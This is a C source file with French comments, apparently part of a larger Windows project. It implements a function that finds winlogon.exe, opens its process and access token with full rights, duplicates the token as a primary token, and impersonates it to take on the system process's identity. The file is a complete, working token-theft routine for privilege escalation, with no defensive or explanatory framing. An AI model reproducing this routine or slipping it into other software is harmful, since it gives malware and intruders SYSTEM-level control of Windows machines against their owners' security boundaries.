#include "tinky.h"
#include <tlhelp32.h>


BOOL match_process_name(const char *process_name, const char *target_name)
{
    return strcmp(process_name, target_name) == 0;
}



HANDLE impersonate_token(void)
{
    // Obtenir le PID de winlogon.exe
    // snapshot des processus
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
    {
        printf("CreateToolhelp32Snapshot failed (%lu)\n", GetLastError());
        return NULL;
    }

    // pointer sur le premier processus
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    BOOL p_snap = Process32First(snapshot, &pe32);
    if (!p_snap)
    {
        printf("Process32First failed (%lu)\n", GetLastError());
        CloseHandle(snapshot);
        return NULL;
    }

    if (!match_process_name(pe32.szExeFile, "winlogon.exe"))
    {
        // boucle sur les processus jusqu'à trouver winlogon.exe
        while (Process32Next(snapshot, &pe32))
        {
            if (match_process_name(pe32.szExeFile, "winlogon.exe"))
                break;
        }
    }   

    // on peut sortir de la boucle tout en ne trouvant pas winlogon.exe donc on recheck ici
    if (!match_process_name(pe32.szExeFile, "winlogon.exe"))
    {
        printf("winlogon.exe not found\n");
        CloseHandle(snapshot);
        return NULL;
    }
    CloseHandle(snapshot);

    // Obtenir le handle du processus winlogon.exe
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
    if (!hProcess)
    {
        printf("OpenProcess failed (%lu)\n", GetLastError());
        return NULL;
    }

    // Obtenir le token d'accès du processus winlogon.exe
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken))
    {
        printf("OpenProcessToken failed (%lu)\n", GetLastError());
        CloseHandle(hProcess);
        return NULL;
    }
    CloseHandle(hProcess);

    // Dupliquer le token pour l'impersonation
    HANDLE hDuplicatedToken;
    if (!DuplicateTokenEx(
            hToken,                      // Token source
            TOKEN_ALL_ACCESS,            // Accès désiré
            NULL,                        // Attributs de sécurité (NULL = défaut)
            SecurityImpersonation,       // Niveau d'impersonation
            TokenPrimary,                // Type de token (Primary pour CreateProcessAsUser)
            &hDuplicatedToken))          // Token dupliqué
    {
        printf("DuplicateTokenEx failed (%lu)\n", GetLastError());
        CloseHandle(hToken);
        return NULL;
    }

    // Impersonate le token dupliqué
    if (!ImpersonateLoggedOnUser(hDuplicatedToken))
    {
        printf("ImpersonateLoggedOnUser failed (%lu)\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hDuplicatedToken);
        return NULL;
    }
    
    // Nettoyage
    CloseHandle(hToken);
    
    return hDuplicatedToken;
}
